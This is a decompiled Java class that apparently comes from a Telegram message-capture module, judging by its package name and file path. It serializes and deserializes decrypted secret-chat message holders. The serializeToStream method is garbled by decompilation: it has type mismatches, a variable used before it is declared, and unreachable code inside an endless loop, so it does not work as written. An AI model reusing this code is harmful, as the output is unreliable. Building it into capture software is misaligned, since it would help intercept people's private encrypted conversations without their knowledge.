package com.vvt.capture.telegram.internal;

public class TLRPC$TL_decryptedMessageHolder
  extends TLObject
{
  public static int constructor = 1431655929;
  public int date;
  public TLRPC.EncryptedFile file;
  public TLRPC.TL_decryptedMessageLayer layer;
  public boolean new_key_used;
  public long random_id;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    long l = paramAbstractSerializedData.readInt64(paramBoolean);
    this.random_id = l;
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.date = i;
    i = paramAbstractSerializedData.readInt32(paramBoolean);
    Object localObject = TLRPC.TL_decryptedMessageLayer.TLdeserialize(paramAbstractSerializedData, i, paramBoolean);
    this.layer = ((TLRPC.TL_decryptedMessageLayer)localObject);
    boolean bool1 = paramAbstractSerializedData.readBool(paramBoolean);
    if (bool1)
    {
      int j = paramAbstractSerializedData.readInt32(paramBoolean);
      localObject = TLRPC.EncryptedFile.TLdeserialize(paramAbstractSerializedData, j, paramBoolean);
      this.file = ((TLRPC.EncryptedFile)localObject);
    }
    boolean bool2 = paramAbstractSerializedData.readBool(paramBoolean);
    this.new_key_used = bool2;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    long l = this.random_id;
    paramAbstractSerializedData.writeInt64(l);
    i = this.date;
    paramAbstractSerializedData.writeInt32(i);
    this.layer.serializeToStream(paramAbstractSerializedData);
    TLRPC.EncryptedFile localEncryptedFile = this.file;
    if (localEncryptedFile != null) {
      i = 1;
    }
    for (;;)
    {
      paramAbstractSerializedData.writeBool(i);
      localEncryptedFile = this.file;
      if (localEncryptedFile != null)
      {
        localEncryptedFile = this.file;
        localEncryptedFile.serializeToStream(paramAbstractSerializedData);
      }
      boolean bool = this.new_key_used;
      paramAbstractSerializedData.writeBool(bool);
      return;
      bool = false;
      localEncryptedFile = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_decryptedMessageHolder.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */